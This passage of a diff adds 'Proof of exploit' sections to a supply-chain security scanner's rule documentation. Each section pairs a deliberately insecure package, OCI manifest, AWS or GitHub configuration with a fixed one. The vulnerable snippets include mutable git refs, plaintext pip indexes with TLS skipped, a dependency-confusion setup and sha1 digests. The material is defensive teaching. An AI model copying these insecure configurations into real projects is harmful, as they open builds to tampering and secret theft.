 **Recommendation.** Pin the git dependency to a 40-character commit SHA: ``"foo": "git+https://github.com/owner/repo.git#<sha>"``. Branch refs (``#main``, ``#master``) and tag refs (``#v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the dependency string. A commit SHA is immutable; a tampered upstream cannot redirect ``#<sha>`` to different content. If the upstream isn't yours, vendor the fork into a registry you control (GitHub Packages, internal Verdaccio) and pin via registry version instead.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: every ``npm install`` re-resolves ``#main``
+// against the upstream repo's HEAD. A push to ``main``
+// (legitimate co-maintainer commit, leaked PAT, hijacked
+// upstream account) ships into your build silently on the
+// next install. ``github:`` shorthand without any ``#``
+// is the same — resolves to default-branch HEAD.
+// package.json
+{
+  "dependencies": {
+    "util-fork": "git+https://github.com/myorg/util-fork.git#main",
+    "tiny-lib": "github:other-org/tiny-lib"
+  }
+}
+
+// Safe: pin to a 40-character commit SHA. The git object
+// is immutable — a re-push at the upstream side cannot
+// retarget ``#<sha>`` to different content. Renovate /
+// Dependabot's npm-vcs ecosystem updaters bump these in
+// reviewable PRs.
+// package.json
+{
+  "dependencies": {
+    "util-fork": "git+https://github.com/myorg/util-fork.git#0123456789abcdef0123456789abcdef01234567",
+    "tiny-lib": "github:other-org/tiny-lib#fedcba9876543210fedcba9876543210fedcba98"
+  }
+}
+```
 
 **Source:** [`NPM-005`](../providers/npm.md) in the [npm provider](../providers/npm.md).
 
@@ -9060,6 +15117,51 @@ Wildcard-broad entries (``*``, ``**``, ``./``) are NOT currently flagged — the
 - Intermediate / cache-only images pushed by CI for later-stage consumption may legitimately ship without attestations to keep build artifacts small. Suppress via ignore-file when this is the deliberate shape, the default expectation for any image that reaches a production registry is a full attestation set.
 - Some registries strip the attestation sub-manifests on pull (``docker pull`` of a single platform unwraps the index). If the JSON you're scanning came from ``docker manifest inspect`` rather than ``docker buildx imagetools inspect --raw``, attestations may be invisible even when present upstream.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the image index ships per-architecture
+# manifests but no ``attestation-manifest`` sibling. A
+# downstream verifier (cosign verify-attestation,
+# slsa-verifier, policy-controller) has nothing to check
+# against, so the deployment can't enforce "only run
+# images with a SLSA L3 build attestation".
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.index.v1+json",
+  "manifests": [
+    { "digest": "sha256:linux-amd64...",
+      "platform": {"architecture": "amd64", "os": "linux"} },
+    { "digest": "sha256:linux-arm64...",
+      "platform": {"architecture": "arm64", "os": "linux"} }
+  ]
+}
+
+# Safe: build with ``docker buildx build
+# --attest=type=provenance,mode=max --attest=type=sbom``
+# so the index carries attestation-manifest siblings
+# linking SLSA provenance + SBOM to each per-platform
+# manifest by digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.index.v1+json",
+  "manifests": [
+    { "digest": "sha256:linux-amd64...",
+      "platform": {"architecture": "amd64", "os": "linux"} },
+    { "digest": "sha256:linux-arm64...",
+      "platform": {"architecture": "arm64", "os": "linux"} },
+    {
+      "digest": "sha256:attest-amd64...",
+      "platform": {"architecture": "unknown", "os": "unknown"},
+      "annotations": {
+        "vnd.docker.reference.type": "attestation-manifest",
+        "vnd.docker.reference.digest": "sha256:linux-amd64..."
+      }
+    }
+  ]
+}
+```
+
 **Source:** [`OCI-002`](../providers/oci.md#oci-002) in the [OCI manifest provider](../providers/oci.md).
 
 ### `OCI-003`: Image manifest is missing the ``image.created`` annotation <span class="pg-sev pg-sev--low">LOW</span> { #detail-oci-003 }
@@ -9087,6 +15189,46 @@ Wildcard-broad entries (``*``, ``**``, ``./``) are NOT currently flagged — the
 **Known false positives.**
 
 - Legacy Windows Server base images (pre-Windows 11 / Server 2022) ship layers from ``mcr.microsoft.com`` with this mechanism. Suppress via ignore-file when the Windows image is intentional, the rule has no way to distinguish a Microsoft-blessed URL from any other.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the manifest declares a layer with a
+# ``urls:`` field. On pull, the client fetches the layer
+# blob from that arbitrary URL, bypassing the registry's
+# content-addressed store. An attacker controlling the URL
+# (DNS, BGP, compromised host) substitutes the blob; the
+# registry's integrity guarantee doesn't extend to foreign
+# URLs.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.nondistributable.v1.tar+gzip",
+      "digest": "sha256:layer-blob-digest...",
+      "size": 12345,
+      "urls": ["https://internal-mirror.example.com/blobs/foo.tgz"]
+    }
+  ]
+}
+
+# Safe: host the layer blob inside the same registry as
+# the manifest. No ``urls:`` field — the client fetches
+# the blob from the registry by digest, and the registry's
+# content-addressed store guarantees the bytes match.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha256:layer-blob-digest...",
+      "size": 12345
+    }
+  ]
+}
+```
 
 **Source:** [`OCI-004`](../providers/oci.md#oci-004) in the [OCI manifest provider](../providers/oci.md).
 
@@ -9131,6 +15273,51 @@ Wildcard-broad entries (``*``, ``**``, ``./``) are NOT currently flagged — the
 
 - Some internal Harbor / Nexus deployments still proxy legacy Docker images that haven't been rebuilt; a pull succeeds because the proxy upgrades the manifest at request time, but the on-disk JSON if you saved it with ``inspect --raw`` may still report the original schemaVersion. If your registry is doing this in-flight promotion you can suppress; otherwise re-run the build.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``schemaVersion: 1`` predates the digest-
+# pinned design. The client has no way to verify that the
+# pulled blobs match what the registry served; a swapped
+# blob is silently accepted. Modern registries refuse v1
+# pushes, but a pre-existing v1 image in a private
+# registry stays pullable and unverified.
+{
+  "schemaVersion": 1,
+  "name": "myorg/legacy-app",
+  "tag": "latest",
+  "architecture": "amd64",
+  "fsLayers": [
+    { "blobSum": "sha256:abc123..." }
+  ],
+  "history": [
+    { "v1Compatibility": "..." }
+  ]
+}
+
+# Safe: rebuild with a current builder (``docker buildx
+# build`` / ``buildah`` / ``ko``). The registry produces a
+# v2 manifest with content-addressed layer descriptors and
+# a ``config`` descriptor that pins the image config by
+# digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha256:config-digest...",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha256:layer-digest...",
+      "size": 32654
+    }
+  ]
+}
+```
+
 **Source:** [`OCI-007`](../providers/oci.md#oci-007) in the [OCI manifest provider](../providers/oci.md).
 
 ### `OCI-008`: Manifest references digest using unsupported hash algorithm <span class="pg-sev pg-sev--high">HIGH</span> { #detail-oci-008 }
@@ -9146,6 +15333,54 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **Known false positives.**
 
 - Test fixtures and intentionally-corrupt CTF images sometimes use degraded hashes for pedagogical reasons. Suppress on the specific path with an ignore-file when this is the deliberate shape.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: descriptors pin layers by ``sha1:`` digest.
+# sha1 has had practical collisions since SHAttered (2017).
+# An attacker who produces a colliding blob substitutes a
+# different tarball without changing the manifest; the
+# registry's content-addressing then ratifies the swap.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha1:abc1234567890abcdef1234567890abcdef12345",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha1:def4567890abcdef1234567890abcdef123456",
+      "size": 32654
+    }
+  ]
+}
+
+# Safe: every descriptor uses ``sha256:`` (or ``sha512:``,
+# also OCI-permitted). The 256-bit hash space rules out
+# birthday-attack collisions at any plausibly-buildable
+# scale; a substituted blob cannot match the recorded
+# digest.
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.oci.image.manifest.v1+json",
+  "config": {
+    "mediaType": "application/vnd.oci.image.config.v1+json",
+    "digest": "sha256:abc123def456abc123def456abc123def456abc123def456abc123def456abc1",
+    "size": 7023
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
+      "digest": "sha256:def456abc123def456abc123def456abc123def456abc123def456abc123def4",
+      "size": 32654
+    }
+  ]
+}
+```
 
 **Source:** [`OCI-008`](../providers/oci.md#oci-008) in the [OCI manifest provider](../providers/oci.md).
 
@@ -9166,6 +15401,38 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **How this is detected.** A CodeBuild project with no VPC configuration runs in AWS-managed network space, egress to the public internet is unrestricted, every package registry / CDN / arbitrary endpoint is reachable. Inside a VPC, security-group + VPC-endpoint policies become the egress gate, which is the only practical way to limit a compromised build's exfiltration paths.
 
 **Recommendation.** Configure the CodeBuild project to run inside a VPC with appropriate subnets and security groups. Use a NAT gateway or VPC endpoints to control outbound internet access and restrict build nodes to only the network resources they require.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a CodeBuild project with no VPC config.
+# The build container runs in AWS's shared VPC with
+# unrestricted outbound internet — exactly the egress
+# path a compromised build uses to exfiltrate secrets
+# or pull a second-stage payload. No VPC flow logs to
+# correlate either.
+import boto3
+cb = boto3.client('codebuild')
+cb.create_project(
+    name='my-build',
+    # no vpcConfig — runs in AWS's shared VPC
+    environment={...},
+    source={...},
+)
+
+# Safe: attach the project to an org-controlled VPC.
+# Egress goes through a NAT + VPC endpoints + (optional)
+# egress firewall; VPC flow logs capture every outbound
+# packet for incident response.
+cb.update_project(
+    name='my-build',
+    vpcConfig={
+        'vpcId': 'vpc-abc123',
+        'subnets': ['subnet-private-1', 'subnet-private-2'],
+        'securityGroupIds': ['sg-codebuild-egress'],
+    },
+)
+```
 
 **Source:** [`PBAC-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -9196,6 +15463,51 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 **How this is detected.** When stage actions don't set their own ``roleArn``, they fall back to the pipeline-level role, which is the union of every stage's needs. A compromise of any one stage (typically the build, which runs untrusted code) gains the deploy stage's authority, including production deploy credentials. Per-action roles cap the radius.
 
 **Recommendation.** Give each stage action (Source, Build, Deploy) its own narrowly-scoped IAM role via ``roleArn`` on the action declaration. Sharing the pipeline-level role means a compromise of one action (e.g. a build) gains the permissions the deploy stage also needs.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every stage in the pipeline references
+# the pipeline's top-level role. A bad release lands
+# in the Source stage with the same authority as the
+# Deploy stage — the Source action can write S3
+# objects the Deploy role can, fetch Secrets Manager
+# values it shouldn't, etc.
+pipeline = {
+    'roleArn': 'arn:aws:iam::123:role/pipeline-master',
+    'stages': [
+        {'name': 'Source', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+        {'name': 'Build', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+        {'name': 'Deploy', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-master'}
+        ]},
+    ],
+}
+
+# Safe: each stage / action carries its own
+# narrowly-scoped role. Source has Read on the source
+# bucket only; Build can write CodeBuild logs; Deploy
+# has CodeDeploy / CloudFormation rights but no
+# Source-bucket write.
+pipeline = {
+    'roleArn': 'arn:aws:iam::123:role/pipeline-orchestrator',
+    'stages': [
+        {'name': 'Source', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-source'}
+        ]},
+        {'name': 'Build', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-build'}
+        ]},
+        {'name': 'Deploy', 'actions': [
+            {'roleArn': 'arn:aws:iam::123:role/pipeline-deploy'}
+        ]},
+    ],
+}
+```
 
 **Source:** [`PBAC-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -9240,6 +15552,37 @@ When ``--require-hashes`` is present, pip enforces hash pinning for every requir
 
 - PyTorch dependency confusion (December 2022): the ``torchtriton`` name on PyPI was claimed by a malicious publisher and pulled in via a nightly build, exfiltrating SSH keys and ``/etc/passwd``. Hash pinning would have rejected the unexpected artifact regardless of which registry resolved the name.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: requirements.txt pins the version literal
+# but doesn't pin the artifact bytes. A registry that
+# silently re-publishes ``requests-2.31.0`` with a
+# backdoored wheel (publisher takeover, mirror compromise,
+# MITM on an internal proxy) ships unverified code on the
+# next ``pip install``. Even ``--require-hashes`` doesn't
+# fire because the file doesn't declare it.
+# requirements.txt
+requests==2.31.0
+urllib3==2.0.7
+certifi==2024.2.2
+
+# Safe: regenerate with ``pip-compile --generate-hashes``
+# (pip-tools). Every line carries a ``--hash=sha256:...``
+# for the wheel and the sdist; ``--require-hashes`` at
+# the top makes pip refuse the install on any mismatch
+# or unhashed line.
+# requirements.txt
+--require-hashes
+requests==2.31.0 \
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1 \
+    --hash=sha256:58cd2187c01e70e6e26505bca751777aa9f2ee0b7f4300988b709f44e013003f
+urllib3==2.0.7 \
+    --hash=sha256:c97dfde1f7bd43a71c8d2a58e369e9b2bf692d1334ea9f9cae55add7d0dd0f84
+certifi==2024.2.2 \
+    --hash=sha256:0569859f95fc761b18b45ef421b1290a0f65f147e92a1e5eb3e635f9a5e4e66f
+```
+
 **Source:** [`PYPI-002`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
 ### `PYPI-003`: requirements.txt uses an HTTP index or disables TLS verification <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-003 }
@@ -9256,6 +15599,32 @@ Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 ca
 
 **Recommendation.** Switch ``--index-url`` and ``--extra-index-url`` to ``https://`` and remove ``--trusted-host``. If your internal index has a self-signed certificate, install the CA into the build environment's truststore (or pass ``PIP_CERT=/path/to/ca.pem``) instead of telling pip to skip verification. ``--trusted-host`` disables TLS verification *and* hash verification for the named host, so anyone on the network path can swap the wheel.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: pip resolves every package against a
+# plaintext-HTTP index. Any network attacker between the
+# build runner and the index (compromised corporate proxy,
+# malicious VPN exit, BGP hijack on the internal mirror)
+# swaps the wheel in flight. ``--trusted-host`` is worse:
+# pip then SKIPS hash verification for that host, so even
+# a ``--require-hashes`` file installs unverified bytes.
+# requirements.txt
+--index-url http://internal-pypi.example.com/simple
+--trusted-host internal-pypi.example.com
+requests==2.31.0
+
+# Safe: HTTPS with the index's certificate validated. For
+# an internal index on a private CA, install the CA into
+# the agent trust store or pass ``PIP_CERT=/path/to/ca.pem``
+# — never ``--trusted-host``. Hashes stay enforced.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+--require-hashes
+requests==2.31.0 \
+    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7ffb0d1cf7af05c3d2791656dbd6ad1e1
+```
+
 **Source:** [`PYPI-003`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
 ### `PYPI-004`: requirements.txt VCS dependency uses a mutable ref <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pypi-004 }
@@ -9265,6 +15634,29 @@ Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 ca
 **How this is detected.** Fires on requirement lines whose URL is a VCS scheme (``git+https://``, ``git+ssh://``, ``hg+``, ``svn+``, ``bzr+``) and whose ``@<ref>`` segment is not a 40-character SHA. A line with no ``@<ref>`` at all also fires — that resolves to the default branch HEAD, the most mutable form. Note: ``foo @ git+https://...`` (PEP 508 direct URL) and ``-e git+https://...#egg=foo`` (legacy editable install) are both detected.
 
 **Recommendation.** Pin VCS requirements to a 40-character commit SHA: ``foo @ git+https://github.com/owner/repo.git@<sha>`` (or the legacy ``-e git+...@<sha>#egg=foo`` form). Branch and tag refs (``@main``, ``@v1.2.3``) are mutable, anyone with push access to the upstream repo can swap the contents of what your build pulls without changing the requirement line. A 40-char SHA is immutable. If the upstream isn't yours, prefer vendoring a fork into a private index and pinning by version + hash (PYPI-001 / PYPI-002).
+
+**Proof of exploit.**
+
+```
+# Vulnerable: every ``pip install -r requirements.txt``
+# resolves ``@main`` against the upstream repo. Whoever
+# can push to ``main`` (legitimate co-maintainer, leaked
+# PAT, account compromise on the upstream owner) ships
+# code into your build silently. Tag refs like ``@v1.2.3``
+# are barely better — git tags are mutable on the upstream
+# side and can be force-pushed at any time.
+# requirements.txt
+shared-utils @ git+https://github.com/myorg/shared-utils.git@main
+-e git+https://github.com/myorg/legacy.git@v1.2.3#egg=legacy
+
+# Safe: pin to a 40-character commit SHA. The git object
+# is immutable — a re-push under the same SHA fails the
+# hash check on fetch. Renovate / Dependabot's pip-vcs
+# ecosystem updaters bump these in reviewable PRs.
+# requirements.txt
+shared-utils @ git+https://github.com/myorg/shared-utils.git@0123456789abcdef0123456789abcdef01234567
+-e git+https://github.com/myorg/legacy.git@fedcba9876543210fedcba9876543210fedcba98#egg=legacy
+```
 
 **Source:** [`PYPI-004`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
@@ -9282,6 +15674,34 @@ If the extra index is a hash-locked internal proxy that serves *both* internal a
 
 - Alex Birsan, "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies" (2021): internal package names harvested from public-facing manifests were registered on public PyPI / npm with higher version numbers; victim builds that declared the public index as an extra automatically pulled the attacker's package on the next install.
 - PyTorch ``torchtriton`` (December 2022): a typosquat name on PyPI's public index was preferred over the internal nightly build, exfiltrating SSH keys via a postinstall step. Single-index installations were unaffected.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip queries BOTH indexes for every package
+# name and picks the highest version. ``acme-internal`` is
+# an internal-only package the org publishes to the
+# private index. An attacker registers ``acme-internal``
+# on public PyPI with version ``99.0.0``; the next ``pip
+# install`` resolves to the attacker's wheel because
+# 99.0.0 > 1.2.3. This is the Birsan dependency-confusion
+# class — Apple / Microsoft / Yelp / Tesla / Uber all paid
+# Birsan a bounty for this exact shape.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+--extra-index-url https://pypi.org/simple
+acme-internal==1.2.3
+requests==2.31.0
+
+# Safe: single index. Configure the internal proxy to
+# transparently mirror PyPI for any name not published
+# internally; pip then resolves every package against ONE
+# source whose name allow-list the operator controls.
+# requirements.txt
+--index-url https://internal-pypi.example.com/simple
+acme-internal==1.2.3
+requests==2.31.0
+```
 
 **Source:** [`PYPI-005`](../providers/pypi.md) in the [PyPI provider](../providers/pypi.md).
 
@@ -9388,6 +15808,39 @@ s3.put_public_access_block(
 **How this is detected.** Default bucket encryption applies SSE-S3 (AES256) to every PutObject. As of January 2023, AWS enables this on all new buckets automatically, but existing buckets created before then can still be unencrypted unless explicitly configured. Without it, individual objects can be uploaded without encryption (the client gets to choose).
 
 **Recommendation.** Enable default bucket encryption using at minimum AES256 (SSE-S3). For stronger key control, use SSE-KMS with a customer-managed key.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: artifact S3 bucket with no server-side
+# encryption configured. Build artifacts (binaries,
+# release tarballs, deploy plans) sit in plaintext;
+# anyone with ``s3:GetObject`` (or anyone who exfils
+# the bucket's backups) reads them.
+import boto3
+s3 = boto3.client('s3')
+# Empty / missing encryption config:
+try:
+    s3.get_bucket_encryption(Bucket='myorg-build-artifacts')
+except s3.exceptions.ClientError:
+    pass   # ServerSideEncryptionConfigurationNotFoundError
+
+# Safe: enable bucket-default SSE — AES-256 (SSE-S3)
+# is the minimum, SSE-KMS with a customer-managed key
+# adds key-rotation + finer-grained access auditing.
+s3.put_bucket_encryption(
+    Bucket='myorg-build-artifacts',
+    ServerSideEncryptionConfiguration={
+        'Rules': [{
+            'ApplyServerSideEncryptionByDefault': {
+                'SSEAlgorithm': 'aws:kms',
+                'KMSMasterKeyID': 'arn:aws:kms:us-east-1:123:key/abc-...'
+            },
+            'BucketKeyEnabled': True,
+        }]
+    }
+)
+```
 
 **Source:** [`S3-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -9537,6 +15990,36 @@ s3.put_public_access_block(
 
 - GitGuardian's annual State of Secrets Sprawl reports find millions of fresh credential leaks per year across public GitHub commits, with the median time-to-revocation measured in days. Native secret scanning alerts the maintainer within minutes of the push, collapsing the exploitable window from days to minutes for the patterns it covers.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a developer pushes a commit that contains a
+# leaked AWS access key in source code. Without secret
+# scanning enabled, GitHub never surfaces an alert; the
+# secret stays in the repo's git history forever and any
+# repo reader (or future fork) extracts it. Public repos
+# are crawled by attackers continuously for AKIA-prefixed
+# strings.
+# GET /repos/myorg/myrepo (vulnerable response):
+{
+  "security_and_analysis": {
+    "secret_scanning": {"status": "disabled"}
+  }
+}
+
+# Safe: enable secret scanning. GitHub then scans every
+# push and historical commit for known credential
+# patterns and surfaces alerts; pair with push protection
+# (SCM-015) so secrets are blocked at push time before
+# they land in history.
+# PATCH /repos/myorg/myrepo:
+{
+  "security_and_analysis": {
+    "secret_scanning": {"status": "enabled"}
+  }
+}
+```
+
 **Source:** [`SCM-004`](../providers/scm.md#scm-004) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }
@@ -9572,6 +16055,31 @@ s3.put_public_access_block(
 
 **Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``allow_force_pushes: true`` on the
+# default branch's protection. A maintainer (or anyone
+# with write access via a compromised token) can rewrite
+# history on ``main``, erasing the audit trail of which
+# commits shipped which behavior. Used to hide malicious
+# commits after the fact.
+# GET /repos/myorg/myrepo/branches/main/protection:
+{
+  "allow_force_pushes": {"enabled": true},
+  "allow_deletions": {"enabled": false}
+}
+
+# Safe: force pushes off. History on ``main`` is now
+# append-only; rebasing or amending requires a PR with
+# the explicit history change.
+# PUT /repos/myorg/myrepo/branches/main/protection:
+{
+  "allow_force_pushes": {"enabled": false},
+  "allow_deletions": {"enabled": false}
+}
+```
+
 **Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }
@@ -9597,6 +16105,28 @@ s3.put_public_access_block(
 
 **Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``allow_deletions: true`` lets anyone with
+# write access delete the default branch entirely. A
+# compromised token (leaked PAT, malicious workflow
+# running with ``contents: write``) erases the branch
+# along with the production deployment trail.
+# GET /repos/myorg/myrepo/branches/main/protection:
+{
+  "allow_deletions": {"enabled": true}
+}
+
+# Safe: branch deletion off. ``main`` cannot be deleted
+# via API or UI without first removing the protection
+# rule, which itself is an audited admin action.
+# PUT /repos/myorg/myrepo/branches/main/protection:
+{
+  "allow_deletions": {"enabled": false}
+}
+```
+
 **Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }
@@ -9606,6 +16136,33 @@ s3.put_public_access_block(
 **How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.
 
 **Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``enforce_admins: false`` (or its absence)
+# lets repo admins push directly to ``main``, skip
+# required reviews, and bypass status checks. An admin's
+# token leak escalates straight to ``main``-write.
+# GET /repos/myorg/myrepo/branches/main/protection:
+{
+  "required_pull_request_reviews": {
+    "required_approving_review_count": 2
+  },
+  "enforce_admins": {"enabled": false}
+}
+
+# Safe: ``enforce_admins: true`` so the protection
+# applies to admins too. Reviews and status checks are
+# no longer bypassable.
+# PUT /repos/myorg/myrepo/branches/main/protection:
+{
+  "required_pull_request_reviews": {
+    "required_approving_review_count": 2
+  },
+  "enforce_admins": {"enabled": true}
+}
+```
 
 **Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).
 
@@ -9665,6 +16222,36 @@ s3.put_public_access_block(
 
 - When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
 - Push protection covers the GitHub-managed pattern set (~200 token patterns from major providers). Custom-pattern support requires GitHub Advanced Security on private repos; public repos get the GitHub-managed set free.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: secret scanning is enabled but push
+# protection is off. Secrets are surfaced AFTER they hit
+# the remote — the credential is already in history,
+# already mirrored to backups, already visible to anyone
+# who fetched between push and rotation. Rotation is the
+# only fix.
+# GET /repos/myorg/myrepo (vulnerable response):
+{
+  "security_and_analysis": {
+    "secret_scanning": {"status": "enabled"},
+    "secret_scanning_push_protection": {"status": "disabled"}
+  }
+}
+
+# Safe: both on. Push protection refuses pushes that
+# carry a recognized credential pattern; the developer
+# sees the rejection at ``git push`` time and rotates
+# BEFORE the secret enters history.
+# PATCH /repos/myorg/myrepo:
+{
+  "security_and_analysis": {
+    "secret_scanning": {"status": "enabled"},
+    "secret_scanning_push_protection": {"status": "enabled"}
+  }
+}
+```
 
 **Source:** [`SCM-015`](../providers/scm.md#scm-015) in the [SCM provider](../providers/scm.md).
 
@@ -9741,6 +16328,33 @@ s3.put_public_access_block(
 
 - Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``default_workflow_permissions: write``
+# means every workflow's ``GITHUB_TOKEN`` starts with
+# repo-write authority. A typo'd ``run:`` (or an
+# injection per GHA-003) can ``git push`` to any branch,
+# open issues, comment on PRs, write packages — the
+# attack surface of every action expands by default.
+# GET /repos/myorg/myrepo/actions/permissions/workflow:
+{
+  "default_workflow_permissions": "write",
+  "can_approve_pull_request_reviews": false
+}
+
+# Safe: ``read`` default. Workflows that genuinely need
+# elevated rights declare per-job ``permissions:`` blocks
+# that scope the token to the specific verbs they need
+# (``contents: write`` for a release publisher,
+# ``packages: write`` for a registry push, etc.).
+# PUT /repos/myorg/myrepo/actions/permissions/workflow:
+{
+  "default_workflow_permissions": "read",
+  "can_approve_pull_request_reviews": false
+}
+```
+
 **Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }
@@ -9754,6 +16368,30 @@ s3.put_public_access_block(
 **Known false positives.**
 
 - Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``can_approve_pull_request_reviews: true``
+# means a workflow's ``GITHUB_TOKEN`` (or an installation
+# token) can approve a pull request. Combined with the
+# required-reviews protection, a malicious workflow self-
+# approves its own PR and lands code into ``main`` without
+# a human reviewer.
+# GET /repos/myorg/myrepo/actions/permissions/workflow:
+{
+  "can_approve_pull_request_reviews": true
+}
+
+# Safe: actions cannot approve PRs. Human approval is
+# the gating signal; automation can comment / label /
+# trigger checks but cannot satisfy the review
+# requirement.
+# PUT /repos/myorg/myrepo/actions/permissions/workflow:
+{
+  "can_approve_pull_request_reviews": false
+}
+```
 
 **Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).
 
@@ -9782,6 +16420,35 @@ s3.put_public_access_block(
 **Known false positives.**
 
 - Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the ``production`` environment has no
+# required reviewers configured. Any workflow that
+# references ``environment: production`` runs without
+# human approval, even when the trigger is a fork PR
+# (with the protections workflow_run is supposed to add).
+# Deploy keys / production secrets bound to the env are
+# accessible to the workflow without a gating human.
+# GET /repos/myorg/myrepo/environments/production:
+{
+  "name": "production",
+  "protection_rules": []
+}
+
+# Safe: required reviewers + a wait timer. The deploy
+# workflow pauses for human approval before the
+# production secrets become resolvable.
+# PUT /repos/myorg/myrepo/environments/production:
+{
+  "name": "production",
+  "reviewers": [
+    {"type": "Team", "id": 1234567}
